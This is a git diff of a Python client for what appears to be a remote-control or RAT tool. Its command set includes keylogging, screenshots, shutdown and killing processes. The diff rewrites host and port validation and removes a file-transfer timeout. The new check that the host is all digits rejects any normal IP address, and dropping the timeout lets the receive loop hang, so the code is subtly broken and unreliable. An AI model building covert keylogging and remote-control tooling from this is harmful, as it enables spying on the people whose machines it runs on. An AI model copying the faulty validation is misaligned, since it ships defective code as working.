@@ -7,7 +7,6 @@ import time
 CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
-CMD_KEY_LOGGER = 'keylogger'
 CMD_VIEW_PROCESSES = 'view_processes'
 CMD_KILL_PROCESS = 'kill_process'
 CMD_START_KEYLOGGER = 'start_keylogger'
@@ -39,8 +38,12 @@ class Client:
     def connect(self, host, port):
         try:
             if not self.is_connected:
-                if host == '' or port == '' or not port.isdigit():
+                if host == '' or port == '':
                     return "[ERROR] Host or port is empty/invalid"
+                if not host.isdigit() or not port.isdigit():
+                    return "[ERROR] Host or port is invalid"
+                if ' ' in host or ' ' in port:
+                    return "[ERROR] Host or port is invalid"
 
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.settimeout(5)
@@ -82,12 +85,8 @@ class Client:
             return e
 
     def save_file(self, path, file_name, mode):
-        start_time = time.time()
         with open(os.path.join(path, file_name), mode) as f:
             while True:
-                if time.time() - start_time > 6:
-                    print("[ERROR] File transfer timeout")
-                    break
                 data = self.socket.recv(BUFFER_SIZE)
                 if data == FLAG_FILE_END.encode():
                     break
